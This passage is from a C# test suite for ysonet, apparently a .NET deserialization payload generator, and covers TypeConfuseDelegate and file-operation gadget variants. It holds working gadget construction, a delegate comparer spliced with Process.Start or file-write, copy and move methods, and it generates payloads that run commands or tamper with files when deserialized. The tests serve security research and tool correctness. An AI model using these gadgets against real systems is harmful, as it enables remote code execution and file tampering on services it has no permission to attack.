            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            bf.Binder = binder;
            using (var ms = new MemoryStream(payload))
                bf.Deserialize(ms);
        }

        // Build a real payload whose command produces the given fire target's effect.
        private static byte[] TcdMarkerPayload(int variant, string formatter, bool minify, bool useSimpleType, FireTarget fire)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = fire.Command;
            ia.IsRawCmd = true;
            ia.Test = false;
            ia.Minify = minify;
            ia.UseSimpleType = useSimpleType;
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "TypeConfuseDelegate",
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
            AssertTrue(r.Success, "TypeConfuseDelegate variant " + variant + " -f " + formatter
                + " generates a marker payload: " + r.ErrorMessage);
            return (byte[])r.Raw;
        }

        // SortedDictionary and TreeSet reject a duplicate key, and the two compared strings
        // ARE the two Process.Start arguments, so an input whose executable and argument
        // strings are equal has no semantics-preserving representation. It must be refused
        // with a clear message, never repaired by mutating the command. An empty argument is
        // normal and must keep working.
        private static void TypeConfuseDelegateVariantKeyEdgeCases()
        {
            foreach (int variant in new[] { 1, 2, 3 })
            {
                // A single raw token: file name "calc.exe", argument "". Distinct, so valid.
                RunResult empty = GenerateTcdRaw("calc.exe", variant);
                AssertTrue(empty.Success,
                    "variant " + variant + " generates when the argument string is empty: " + empty.ErrorMessage);
            }

            // Equal executable and argument strings. Variant 1 still GENERATES, but the
            // payload is a dud: SortedSet drops the duplicate, so the serialized set holds one
            // element and SortedSet.AddIfNotPresent returns at the empty-root case on
            // deserialize without ever calling the comparer. Assert the collapse directly on
            // the live gadget object, so the limitation is tested rather than assumed - and so
            // nothing can start recommending variant 1 as the workaround for this input.
            InputArgs dup = new InputArgs();
            dup.Cmd = "dup.exe dup.exe";
            dup.IsRawCmd = true;
            dup.Test = false;
            var collapsed = (System.Collections.Generic.SortedSet<string>)
                TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(dup);
            AssertEqual(1, collapsed.Count,
                "variant 1 collapses equal executable and argument strings to a single element");

            RunResult v1 = GenerateTcdRaw("dup.exe dup.exe", 1);
            AssertTrue(v1.Success, "variant 1 (SortedSet) still generates for equal strings: " + v1.ErrorMessage);

            foreach (int variant in new[] { 2, 3 })
            {
                RunResult r = GenerateTcdRaw("dup.exe dup.exe", variant);
                AssertTrue(!r.Success, "variant " + variant + " rejects equal executable and argument strings");
                AssertTrue((r.ErrorMessage ?? "").IndexOf("distinct", StringComparison.OrdinalIgnoreCase) >= 0,
                    "variant " + variant + " explains why: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").IndexOf("so they differ", StringComparison.OrdinalIgnoreCase) >= 0,
                    "variant " + variant + " tells the user the only real fix: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").IndexOf("does not fire", StringComparison.OrdinalIgnoreCase) >= 0,
                    "variant " + variant + " does not present variant 1 as a working workaround: " + r.ErrorMessage);
            }
        }

        // Formatter-expansion result, locked as a test instead of left as an assumption.
        // TypeConfuseDelegate advertises BinaryFormatter, NetDataContractSerializer and
        // LosFormatter, and the container swap does not widen that set: all three roots are
        // GENERIC types (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter cannot
        // serialize a generic type. This asserts the limitation for every container rather
        // than silently omitting the formatter, so if a framework or serializer change ever
        // lifts it, the test says so.
        private static void TypeConfuseDelegateContainersCannotUseSoapFormatter()
        {
            foreach (int variant in new[] { 1, 2, 3 })
            {
                AssertTrue(!Gadget("TypeConfuseDelegate").IsSupported("SoapFormatter"),
                    "SoapFormatter is not advertised by TypeConfuseDelegate");

                var gen = new TypeConfuseDelegateGenerator();
                gen.Options().Parse(new[] { "--variant", variant.ToString() });
                InputArgs ia = new InputArgs();
                ia.Cmd = "calc.exe";
                ia.Test = false;

                AssertThrows(delegate { gen.Generate("SoapFormatter", ia); },
                    "SoapFormatter cannot serialize the generic root of variant " + variant);
            }
        }

        // Every declared variant must generate from the variant flag ALONE. A gadget's
        // var/variant number is its own; it must never be consumed by a hardcoded inner gadget
        // that happens to use the same option name (GenericGenerator.GenerateInner is what
        // keeps them apart). This test deliberately passes nothing but the variant.
        //
        // Scoped to gadgets whose -c is a shell command or unused, so it stays fast and does
        // not invoke the C# compiler. The file/dll-input gadgets are covered by the FULL matrix.
        private static void EveryVariantGeneratesFromTheVariantFlagAlone()
        {
            // Every declared variant builds from its number alone. There used to be one
            // exception here, ObjectDataProvider variant 3, whose real input arrived through
            // --xamlurl; that variant is now the ResourceDictionary gadget and takes a -c.
            var needsOwnExtraInput = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            var failures = new List<string>();
            int checkedCells = 0;

            foreach (string name in GadgetRegistry.GetGadgetNames())
            {
                if (name == "Generic") continue;
                IGenerator g = GadgetRegistry.CreateGadgetInstance(name);
                if (g == null) continue;

                var variants = g.Variants();
                if (variants == null || variants.Count == 0) continue;

                string variantFlag = VariantFlagFor(g);
                string formatter = g.SupportedFormatters()[0].Split(' ')[0];

                foreach (GadgetVariant v in variants)
                {
                    CommandInputType inType = v.EffectiveInput(g.CommandInput());
                    if (inType != CommandInputType.ShellCommand && inType != CommandInputType.Ignored)
                        continue;
                    if (!v.SupportsFormatter(formatter)) continue;
                    if (needsOwnExtraInput.Contains(name + "|" + v.Number)) continue;

                    InputArgs ia = new InputArgs();
                    ia.Cmd = "calc.exe";
                    ia.Test = false;
                    ia.ExtraArguments = new List<string> { variantFlag, v.Number.ToString() };

                    RunResult r;
                    try
                    {
                        r = PayloadRunner.GenerateGadget(new GenerationRequest
                        {
                            GadgetName = name,
                            FormatterName = formatter,
                            OutputFormat = "",
                            InputArgs = ia,
                        });
                    }
                    catch (Exception ex) { r = RunResult.Fail("THREW " + ex.Message); }

                    checkedCells++;
                    if (!r.Success)
                        failures.Add(name + " " + variantFlag + " " + v.Number + " -f " + formatter
                            + " -> " + r.ErrorMessage);
                    else if (RawIsEmpty(r.Raw))
                        failures.Add(name + " " + variantFlag + " " + v.Number + " -> empty payload");
                }
            }

            AssertTrue(checkedCells > 0, "the variant sweep actually checked something");
            AssertTrue(failures.Count == 0,
                "every variant generates from the variant flag alone (" + checkedCells + " checked): "
                    + string.Join(" | ", failures.ToArray()));
        }

        // The interactive editor must offer all three container labels, start on the
        // SortedSet default, and emit the NUMBER on the command line, not the label.
        private static void EditorExposesTypeConfuseDelegateContainerVariants()
        {
            var ed = new ModuleEditor(null, null, true, null, null);
            var fields = ed.BuildFieldsForTest("TypeConfuseDelegate");

            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null, "the variant field is offered for TypeConfuseDelegate");
            AssertTrue(variant.Choices != null && variant.Choices.Count == 3,
                "all three container labels are offered");

            var declared = Gadget("TypeConfuseDelegate").Variants();
            for (int i = 0; i < declared.Count; i++)
                AssertEqual(declared[i].Label, variant.Choices[i], "label " + (i + 1) + " is in variant order");
            AssertEqual(declared[0].Label, variant.Value, "the editor starts on variant 1 (the SortedSet default)");

            FindEditable(fields, "command").Value = "calc.exe";
            string flag = VariantFlagFor(Gadget("TypeConfuseDelegate"));

            variant.Value = declared[2].Label; // TreeSet
            string line = ed.GadgetCommandLineForTest();
            AssertTrue(line.Contains(flag + " 3"),
                "the echoed command line carries the numeric variant: " + line);
            AssertTrue(!line.Contains(declared[2].Label),
                "the human label never leaks into the command line: " + line);

            variant.Value = declared[1].Label; // SortedDictionary
            AssertTrue(ed.GadgetCommandLineForTest().Contains(flag + " 2"),
                "switching the label switches the emitted number: " + ed.GadgetCommandLineForTest());
        }

        // The var/variant flag on the command line belongs to the OUTER gadget. Now that
        // TypeConfuseDelegate has its own var/variant for the root container, and inner-gadget
        // callers hand their InputArgs straight down, an unisolated outer --variant would leak:
        // 4 fails the whole generation (the outer gadget has more variants than TCD) and 2 or 3
        // silently swaps the inner container. GenericGenerator.GenerateInner isolates the
        // option list, and every wrapper with a hardcoded inner gadget uses it.
        private static void OuterVariantDoesNotReachTheInnerTypeConfuseDelegate()
        {
            // These outer gadgets declare 4 variants and wrap a TypeConfuseDelegate inner.
            foreach (string gadget in new[] { "GetterSecurityException", "GetterSettingsPropertyValue" })
            {
                RunResult r = GenerateWithVariant(gadget, "Json.NET", 4);
                AssertTrue(r.Success,
                    gadget + " variant 4 still builds its TypeConfuseDelegate inner: " + r.ErrorMessage);
            }

            // An outer variant inside TypeConfuseDelegate's own 1-3 range must not change the
            // inner payload either, so the isolated build matches a run with no --variant.
            byte[] clean = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", CalcInput());
            AssertTrue(clean != null && clean.Length > 0, "the default inner payload is non-empty");
            foreach (int outer in new[] { 1, 2, 3, 4 })
            {
                InputArgs ia = CalcInput();
                ia.ExtraArguments = new List<string> { "--variant", outer.ToString() };
                byte[] withOuter = (byte[])new TypeConfuseDelegateGenerator().GenerateInner("BinaryFormatter", ia);
                AssertTrue(BytesEqual(clean, withOuter),
                    "an outer --variant " + outer + " does not change the default inner TypeConfuseDelegate payload");
            }
        }

        // The command path RELIES on the sorted container's ordering rule instead of
        // enforcing it: Process.Start only receives the executable in parameter 1 while the
        // executable sorts above the argument string. The default "cmd /c <command>"
        // wrapping is safe by construction ("/" sorts below "c"), but --rawcmd removes that
        // wrapper and a command like "notepad.exe zzz.txt" comes out swapped.
        //
        // Until that input is refused outright, the generator NOTES it - and only in debug
        // mode. That gate is the tested behavior, not an implementation detail: ysonet is
        // embedded as a payload generator by other tools, and a wrapper that merges stderr
        // into what it captures would carry the text into a base64 payload field.
        private static void TypeConfuseDelegateNotesSwappedArgumentsInDebugOnly()
        {
            const string swapped = "notepad.exe zzz.txt";   // executable sorts BELOW its argument
            const string ordered = "zzz.exe aaa.txt";       // and this pair is the right way round

            // Assert the fixtures really are what the test claims, so it cannot pass by
            // accident if the ordering ever stops diverging.
            AssertTrue(String.Compare("notepad.exe", "zzz.txt") < 0,
                "the swapped fixture really does sort the wrong way round");
            AssertTrue(String.Compare("zzz.exe", "aaa.txt") > 0,
                "the ordered fixture really does sort the right way round");

            string outDebug, errDebug, outQuiet, errQuiet;
            byte[] debugBytes = GenerateTcdCapturing(swapped, true, true, out outDebug, out errDebug);
            byte[] quietBytes = GenerateTcdCapturing(swapped, true, false, out outQuiet, out errQuiet);

            AssertTrue(errDebug.Contains("[TypeConfuseDelegate]"),
                "debug mode notes the problem on stderr: " + errDebug);
            AssertTrue(errDebug.Contains("swapped"),
                "the note says what actually happens to the two strings: " + errDebug);
            AssertTrue(errDebug.Contains("--rawcmd"),
                "the note says how to avoid it: " + errDebug);

            // The reason the note is gated. An embedding tool that merges the streams and
            // base64-encodes what it captured must never receive this text.
            AssertEqual("", errQuiet, "a normal run writes nothing to stderr");
            AssertEqual("", outDebug, "the note never reaches stdout, which carries the payload");
            AssertEqual("", outQuiet, "a normal run writes nothing to stdout either");

            // The note is an observation, not a change: identical payload either way.
            AssertTrue(BytesEqual(debugBytes, quietBytes),
                "noting the problem does not change a single byte of the payload");

            // No false positives, in debug mode where a note would be visible:
            string o, e;
            GenerateTcdCapturing(ordered, true, true, out o, out e);
            AssertEqual("", e, "a correctly ordered raw command produces no note");

            GenerateTcdCapturing("calc.exe", true, true, out o, out e);
            AssertEqual("", e, "a raw command with no arguments produces no note (\"\" sorts lowest)");

            // ...including the DEFAULT path, whose "cmd /c" wrapper is exactly why this has
            // gone unnoticed: the pair is always "cmd" and "/c ...".
            GenerateTcdCapturing("notepad.exe zzz.txt", false, true, out o, out e);
            AssertEqual("", e, "the default cmd /c wrapping always sorts correctly, so no note");
        }

        // Generate a TypeConfuseDelegate BinaryFormatter payload, capturing everything
        // generation wrote to stdout and stderr.
        private static byte[] GenerateTcdCapturing(string cmd, bool rawCmd, bool debugMode,
            out string stdout, out string stderr)
        {
            var so = new StringWriter();
            var se = new StringWriter();
            TextWriter prevOut = Console.Out, prevErr = Console.Error;
            RunResult r;
            Console.SetOut(so);
            Console.SetError(se);
            try
            {
                InputArgs ia = new InputArgs();
                ia.Cmd = cmd;
                ia.IsRawCmd = rawCmd;
                ia.Test = false;
                ia.IsDebugMode = debugMode;
                r = PayloadRunner.GenerateGadget(new GenerationRequest
                {
                    GadgetName = "TypeConfuseDelegate",
                    FormatterName = "BinaryFormatter",
                    OutputFormat = "",
                    InputArgs = ia,
                });
            }
            finally { Console.SetOut(prevOut); Console.SetError(prevErr); }

            stdout = so.ToString();
            stderr = se.ToString();
            AssertTrue(r.Success, "TypeConfuseDelegate generates for \"" + cmd + "\": " + r.ErrorMessage);
            return Bytes(r.Raw);
        }

        // Generate with a RAW command (no "cmd /c" wrapper), so the test controls exactly how
        // the command splits into the executable and argument strings.
        private static RunResult GenerateTcdRaw(string rawCmd, int variant)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = rawCmd;
            ia.IsRawCmd = true;
            ia.Test = false;
            ia.ExtraArguments = new List<string> { "--variant", variant.ToString() };
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = "TypeConfuseDelegate",
                FormatterName = "BinaryFormatter",
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        // The three command-path builders moved behind one shared builder
        // (TypeConfuseDelegateGenerator.BuildConfusedContainer), which the XAML path now uses
        // too. A refactor of a SHIPPED payload must not change a byte, so each container is
        // rebuilt here the way its own builder used to and compared on the wire. This is a
        // permanent lock, not a one-off check: any future change to the shared builder that
        // alters the serialized graph fails here.
        private static void TypeConfuseDelegateSharedBuilderKeepsTheOriginalGraphs()
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = "calc.exe /x";
            ia.IsRawCmd = true;
            ia.Test = false;

            string key1 = ia.CmdFileName;
            string key2 = ia.HasArguments ? ia.CmdArguments : "";
            AssertTrue(!string.IsNullOrEmpty(key1) && key1 != key2,
                "the fixture command splits into two distinct strings (got \"" + key1 + "\" and \"" + key2 + "\")");

            // Variant 1 through its public builder.
            AssertTrue(BytesEqual(BfBytes(ReferenceCommandGraph(1, key1, key2)),
                                  BfBytes(TypeConfuseDelegateGenerator.TypeConfuseDelegateGadget(ia))),
                "the SortedSet command payload still serializes the original graph");

            // Variants 2 and 3 through the CLI path, because their builders are private. The
            // non-minified BinaryFormatter route is a plain BinaryFormatter.Serialize (see
            // GenericGenerator.Serialize), so the generated payload must equal the reference
            // graph byte for byte.
            foreach (int container in new[] { 2, 3 })
            {
                RunResult r = GenerateTcdRaw("calc.exe /x", container);
                AssertTrue(r.Success, "variant " + container + " generates: " + r.ErrorMessage);
                AssertTrue(BytesEqual(BfBytes(ReferenceCommandGraph(container, key1, key2)), Bytes(r.Raw)),
                    "variant " + container + " still serializes the original graph");
            }

            // The XAML path shares the same builder, and the builder now takes the benign
            // comparison as a parameter. The file-operation gadget passes
            // String.CompareOrdinal; passing it here instead would silently change every
            // ActivitySurrogateDisableTypeCheck / XamlAssemblyLoadFromFile payload on the
            // wire. Nothing else would notice - the containers would still fire - so assert
            // the serialized method name directly for all three roots.
            //
            // (The reference-graph comparison above cannot be used for this path: building
            // a XamlReader.Parse delegate would make the test project reference
            // PresentationFramework, which it deliberately does not.)
            const string xaml = "<ResourceDictionary xmlns=\"x\" />";
            foreach (int container in new[] { 1, 2, 3 })
            {
                string text = Encoding.ASCII.GetString(
                    BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml, container)));
                AssertTrue(text.Contains("Compare") && !text.Contains("CompareOrdinal"),
                    "the XAML wrapper still serializes the original culture-sensitive "
                    + "String.Compare (container " + container + ")");
                AssertTrue(text.Contains("XamlReader"),
                    "the XAML wrapper still splices XamlReader.Parse (container " + container + ")");
            }
        }

        // The command-path graph as the three separate builders used to build it: comparer,
        // fill the root with the two strings while the comparison is still benign, then splice
        // Process.Start into invocation-list slot 1.
        private static object ReferenceCommandGraph(int container, string key1, string key2)
        {
            return ReferenceGraph(container, new Comparison<string>(String.Compare),
                new Func<string, string, System.Diagnostics.Process>(System.Diagnostics.Process.Start),
                key1, key2);
        }

        // The same reference build for any benign comparison and any spliced delegate, so a
        // test can reproduce the XAML path and the file-operation path too.
        private static object ReferenceGraph(int container, Comparison<string> benign,
            Delegate slot1, string key1, string key2)
        {
            Delegate da = benign;
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            IComparer<string> comp = Comparer<string>.Create(d);

            object root;
            if (container == 2)
            {
                var dictionary = new SortedDictionary<string, string>(comp);
                dictionary.Add(key1, "");
                dictionary.Add(key2, "");
                root = dictionary;
            }
            else if (container == 3)
            {
                Type openTreeSet = typeof(SortedSet<>).Assembly.GetType(
                    "System.Collections.Generic.TreeSet`1", false);
                AssertTrue(openTreeSet != null, "the internal TreeSet type is available");
                root = Activator.CreateInstance(openTreeSet.MakeGenericType(typeof(string)),
                    new object[] { comp });
                var items = (ICollection<string>)root;
                items.Add(key1);
                items.Add(key2);
            }
            else
            {
                var set = new SortedSet<string>(comp);
                set.Add(key1);
                set.Add(key2);
                root = set;
            }

            System.Reflection.FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
            object[] invoke_list = d.GetInvocationList();
            invoke_list[1] = slot1;
            fi.SetValue(d, invoke_list);
            return root;
        }

        private static byte[] BfBytes(object graph)
        {
            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            using (var ms = new MemoryStream())
            {
                bf.Serialize(ms, graph);
                return ms.ToArray();
            }
        }

        // ---- TypeConfuseDelegateFileOperations ---------------------------------
        //
        // The same delegate confusion with a two-string BCL file method in invocation-list
        // slot 1 instead of Process.Start, so a deserialize writes, copies, moves or
        // truncates on the target without starting a process. Five operations (--variant)
        // crossed with the three serialized roots (--rootcontainer).

        private const string FileOpsGadget = "TypeConfuseDelegateFileOperations";

        private static readonly string[] FileOpsFormatters =
            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };

        // The deserializer tag PayloadsFireIntoTestSinks uses for each of them.
        private static string FileOpsDeserTag(string formatter)
        {
            switch (formatter)
            {
                case "BinaryFormatter": return "bf";
                case "LosFormatter": return "los";
                case "NetDataContractSerializer": return "ndc";
                default: throw new Exception("no deserializer tag for " + formatter);
            }
        }

        private static RunResult GenerateFileOps(int variant, string cmd, string formatter,
            int? rootContainer, bool minify)
        {
            InputArgs ia = new InputArgs();
            ia.Cmd = cmd;
            ia.Test = false;
            ia.Minify = minify;
            var extra = new List<string> { "--variant", variant.ToString() };
            if (rootContainer.HasValue)
            {
                extra.Add("--" + TypeConfuseDelegateGenerator.RootContainerOptionName);
                extra.Add(rootContainer.Value.ToString());
            }
            ia.ExtraArguments = extra;
            return PayloadRunner.GenerateGadget(new GenerationRequest
            {
                GadgetName = FileOpsGadget,
                FormatterName = formatter,
                OutputFormat = "",
                InputArgs = ia,
            });
        }

        private static RunResult GenerateFileOps(int variant, string cmd)
        {
            return GenerateFileOps(variant, cmd, "BinaryFormatter", null, false);
        }

        // The BinaryFormatter bytes read as ASCII, so the embedded type-name and
        // method-name records can be searched.
        private static string FileOpsStreamText(int variant, string cmd, int? rootContainer)
        {
            RunResult r = GenerateFileOps(variant, cmd, "BinaryFormatter", rootContainer, false);
            AssertTrue(r.Success, FileOpsGadget + " variant " + variant + " generates: " + r.ErrorMessage);
            return Encoding.ASCII.GetString(Bytes(r.Raw));
        }

        // A path inside the test artifact directory. The 'zz' / 'aa' prefixes are how the
        // fixtures satisfy the gadget's ordinal-ordering rule without the generator ever
        // rewriting what the test asked for.
        private static string FileOpsPath(string name)
        {
            return TestArtifactPath("ysonet_fileops_" + name);
        }

        // Content whose FIRST character sorts below any Windows path start ('!' is 0x21,
        // below every drive letter and below '\'), so every target path in these tests
        // sorts after the embedded text ordinally.
        private const string FileOpsLowSortingText = "!ysonet file-operations fixture\r\n";

        // The graph must serialize String.CompareOrdinal, not the culture-sensitive
        // String.Compare the command path uses, because the order the two strings are
        // written in is what fixes the sink's argument order. It must also carry the real
        // two-string BCL method for the chosen operation, so a variant cannot silently
        // fall back to another one.
        private static void FileOperationsSerializeAnOrdinalComparerAndTheRealSink()
        {
            string target = FileOpsPath("zz_names.txt");
            string content = MakeTempFile("ysonet_fileops_names_content.txt", FileOpsLowSortingText);
            try
            {
                var sinks = new Dictionary<int, string>
                {
                    { 1, "WriteAllText" }, { 2, "Copy" }, { 3, "Move" },
                    { 4, "Move" }, { 5, "WriteAllText" },
                };
                var declaringTypes = new Dictionary<int, string>
                {
                    { 1, "System.IO.File" }, { 2, "System.IO.File" }, { 3, "System.IO.File" },
                    { 4, "System.IO.Directory" }, { 5, "System.IO.File" },
                };

                foreach (int variant in new[] { 1, 2, 3, 4, 5 })
                {
                    string cmd = FileOpsSampleCommand(variant, target, content);
                    string text = FileOpsStreamText(variant, cmd, null);

                    AssertTrue(text.Contains("CompareOrdinal"),
                        "variant " + variant + " serializes the ordinal benign comparison");
                    AssertTrue(text.Contains("System.Action`2"),
                        "variant " + variant + " carries the two-string Action delegate type");
                    AssertTrue(text.Contains(declaringTypes[variant]),
                        "variant " + variant + " targets " + declaringTypes[variant]);
                    AssertTrue(text.Contains(sinks[variant]),
                        "variant " + variant + " targets " + sinks[variant]);
                    AssertTrue(text.Contains("System.DelegateSerializationHolder"),
                        "variant " + variant + " still carries the delegate serialization holder");
                    AssertTrue(!text.Contains("System.Diagnostics.Process"),
                        "variant " + variant + " starts no process");
                }

                // The command gadget is unchanged: it still ships the culture-sensitive
                // comparison, so this refactor cannot have altered its payloads.
                string tcd = TcdStreamText(1);
                AssertTrue(tcd.Contains("Compare") && !tcd.Contains("CompareOrdinal"),
                    "TypeConfuseDelegate still serializes the original String.Compare");
            }
            finally { SafeDelete(content); }
        }

        // A valid -c for each operation, given a target path and a local content file.
        private static string FileOpsSampleCommand(int variant, string target, string contentFile)
        {
            if (variant == 1)
                return target + ";" + contentFile;
            if (variant == 5)
                return target;
            return FileOpsPath("zz_source.txt") + ";" + FileOpsPath("aa_destination.txt");
        }

        // The whole reason the builder takes a benign comparison: the container is sorted
        // HERE, at generation time, so the payload's argument order is decided by whatever
        // comparison fills it. With the culture-sensitive String.Compare the command path
        // uses, "aa..." sorts BELOW "BB..." and the two arguments would come out reversed;
        // ordinally "aa..." sorts above it. This proves both halves: the bytes do not move
        // when the operator's culture changes, and the operation really receives its source
        // first even in the case where the two comparisons disagree.
        private static void FileOperationsOrderingIsOrdinalNotCultural()
        {
            string source = FileOpsPath("aa_culture_source.txt");
            string dest = FileOpsPath("BB_culture_dest.txt");

            AssertTrue(String.CompareOrdinal(source, dest) > 0,
                "the fixture pair sorts source-first ordinally");
            AssertTrue(String.Compare(source, dest, StringComparison.CurrentCulture) < 0,
                "the same pair sorts the OTHER way under the current culture, which is what "
                + "makes this a real test");

            // Culture independence: identical bytes under two unrelated cultures.
            byte[] underEnglish = FileOpsBytesUnderCulture("en-US", 2, source + ";" + dest);
            byte[] underTurkish = FileOpsBytesUnderCulture("tr-TR", 2, source + ";" + dest);
            byte[] underSwedish = FileOpsBytesUnderCulture("sv-SE", 2, source + ";" + dest);
            AssertTrue(BytesEqual(underEnglish, underTurkish) && BytesEqual(underEnglish, underSwedish),
                "the payload is byte-identical whatever culture it is generated under");

            // Direction: the copy must go source -> destination. If the arguments came out
            // reversed, File.Copy would be asked to read a file that does not exist and the
            // destination would never appear.
            SafeDelete(source);
            SafeDelete(dest);
            try
            {
                File.WriteAllText(source, "ordinal ordering keeps the source first");
                RunSTA(delegate { DeserializeAs("bf", underEnglish); });

                AssertTrue(File.Exists(dest),
                    "the copy ran with the source as its FIRST argument (destination created)");
                AssertEqual("ordinal ordering keeps the source first", File.ReadAllText(dest),
                    "the destination holds the source content");
                AssertTrue(File.Exists(source), "File.Copy leaves the source in place");
            }
            finally { SafeDelete(source); SafeDelete(dest); }
        }

        private static byte[] FileOpsBytesUnderCulture(string culture, int variant, string cmd)
        {
            var previous = System.Threading.Thread.CurrentThread.CurrentCulture;
            try
            {
                System.Threading.Thread.CurrentThread.CurrentCulture =
                    new System.Globalization.CultureInfo(culture);
                RunResult r = GenerateFileOps(variant, cmd);
                AssertTrue(r.Success, "generates under " + culture + ": " + r.ErrorMessage);
                return Bytes(r.Raw);
            }
            finally { System.Threading.Thread.CurrentThread.CurrentCulture = previous; }
        }

        // An input the primitive cannot represent must be refused before serialization,
        // with a message that names the operation and both fields. Never repaired by
        // swapping or rewriting what the user typed.
        private static void FileOperationsRefuseAnImpossibleOrder()
        {
            var reversed = new Dictionary<int, string>
            {
                { 2, FileOpsPath("aa_src.txt") + ";" + FileOpsPath("zz_dst.txt") },
                { 3, FileOpsPath("aa_src.txt") + ";" + FileOpsPath("zz_dst.txt") },
                { 4, FileOpsPath("aa_src") + ";" + FileOpsPath("zz_dst") },
            };
            var names = new Dictionary<int, string> { { 2, "copy" }, { 3, "move" }, { 4, "dirmove" } };

            foreach (KeyValuePair<int, string> kv in reversed)
            {
                RunResult r = GenerateFileOps(kv.Key, kv.Value);
                AssertTrue(!r.Success, "variant " + kv.Key + " refuses a reversed pair");
                AssertTrue((r.ErrorMessage ?? "").Contains(names[kv.Key]),
                    "the refusal names the operation: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").Contains("String.CompareOrdinal"),
                    "the refusal names the comparison that decides: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").Contains("source path")
                    && (r.ErrorMessage ?? "").Contains("destination path"),
                    "the refusal names both semantic fields: " + r.ErrorMessage);

                string same = FileOpsPath("same.txt");
                RunResult equal = GenerateFileOps(kv.Key, same + ";" + same);
                AssertTrue(!equal.Success, "variant " + kv.Key + " refuses an equal pair");
                AssertTrue((equal.ErrorMessage ?? "").Contains("String.CompareOrdinal"),
                    "the equal-pair refusal explains the rule: " + equal.ErrorMessage);
            }

            // The write operation compares the target path against the EMBEDDED TEXT, so a
            // content file whose text sorts above the target path is refused the same way.
            string high = MakeTempFile("ysonet_fileops_high_content.txt", "zzzz sorts above any path");
            try
            {
                RunResult r = GenerateFileOps(1, FileOpsPath("aa_target.txt") + ";" + high);
                AssertTrue(!r.Success, "write refuses content that sorts above the target path");
                AssertTrue((r.ErrorMessage ?? "").Contains("embedded text"),
                    "the write refusal names the embedded text, not the file path: " + r.ErrorMessage);
                AssertTrue((r.ErrorMessage ?? "").Contains("change the content")
                    || (r.ErrorMessage ?? "").Contains("Change the target path"),
                    "the write refusal suggests what to change: " + r.ErrorMessage);
            }
            finally { SafeDelete(high); }

            // Variant 5 pairs the path with an internal "", which every non-empty string
            // sorts after, so it only needs the normal non-empty check.
            AssertTrue(GenerateFileOps(5, FileOpsPath("aa_empty_target.txt")).Success,
                "the empty-file operation accepts a low-sorting target path");
        }

        // -c is split on the FIRST ';' only, both halves are preserved verbatim, and the
        // single-field operation treats a ';' as part of the path.
        private static void FileOperationsParseTheCommandStrictly()
        {
            foreach (int variant in new[] { 1, 2, 3, 4 })
            {
                RunResult noSep = GenerateFileOps(variant, FileOpsPath("zz_only.txt"));
                AssertTrue(!noSep.Success, "variant " + variant + " needs the ';' separator");
                AssertTrue((noSep.ErrorMessage ?? "").Contains(";"),
                    "the message shows the ';' is missing: " + noSep.ErrorMessage);

                AssertTrue(!GenerateFileOps(variant, ";" + FileOpsPath("aa.txt")).Success,
                    "variant " + variant + " refuses an empty first field");
                AssertTrue(!GenerateFileOps(variant, FileOpsPath("zz.txt") + ";").Success,
                    "variant " + variant + " refuses an empty second field");
            }

            // Later semicolons and spaces belong to the second field.
            string source = FileOpsPath("zz source.txt");
            string dest = FileOpsPath("aa dest;with;semicolons.txt");
            string text = FileOpsStreamText(2, source + ";" + dest, null);
            AssertTrue(text.Contains(dest),
                "everything after the first ';' is one destination path, spaces and all");
            AssertTrue(text.Contains(source), "the source path is preserved verbatim");

            // Variant 5 takes the whole value, so a ';' inside the path is unambiguous.
            string odd = FileOpsPath("zz_weird;name.txt");
            AssertTrue(FileOpsStreamText(5, odd, null).Contains(odd),
                "the empty-file operation treats the whole -c value as the target path");
            AssertTrue(!GenerateFileOps(5, "").Success, "the empty-file operation needs a path");
        }

        // The write operation reads its content on THIS machine while the payload is built.
        // Proof: generate, delete the fixture, then deserialize and still get the exact text
        // at the target. It also must never silently treat a missing file as inline text.
        private static void FileOperationsWriteEmbedsTheLocalFileAtGenerationTime()
        {
            // Non-ASCII, plus a UTF-8 BOM on the fixture. File.ReadAllText consumes the BOM,
            // and File.WriteAllText(string,string) writes UTF-8 with no BOM, so the transfer
            // preserves CHARACTERS, not the source file's bytes.
            // The non-ASCII characters are written as \u escapes so this source file itself
            // stays pure ASCII and cannot be corrupted by a compiler codepage guess.
            string body = FileOpsLowSortingText
                + "\u00c4\u00d6\u00dc caf\u00e9 \u4f60\u597d\r\nlast line\r\n";
            string fixture = TestArtifactPath("ysonet_fileops_bom_content.txt");
            string target = FileOpsPath("zz_write_target.txt");
            SafeDelete(fixture);
            SafeDelete(target);
            try
            {
                File.WriteAllText(fixture, body, new UTF8Encoding(true));
                AssertTrue(File.Exists(fixture), "the BOM-bearing content fixture survived the write");
                AssertTrue(File.ReadAllBytes(fixture)[0] == 0xEF, "the fixture really starts with a BOM");
                AssertTrue(String.CompareOrdinal(target, body) > 0,
                    "the fixture pair satisfies the ordinal rule without the generator changing it");

                RunResult r = GenerateFileOps(1, target + ";" + fixture);
                AssertTrue(r.Success, "the write payload generates: " + r.ErrorMessage);
                byte[] payload = Bytes(r.Raw);

                // Delete the source of the text: if anything were read at DESERIALIZE time
                // instead, the next step could not reproduce it.
                SafeDelete(fixture);
                AssertTrue(!File.Exists(fixture), "the local content file is gone before firing");

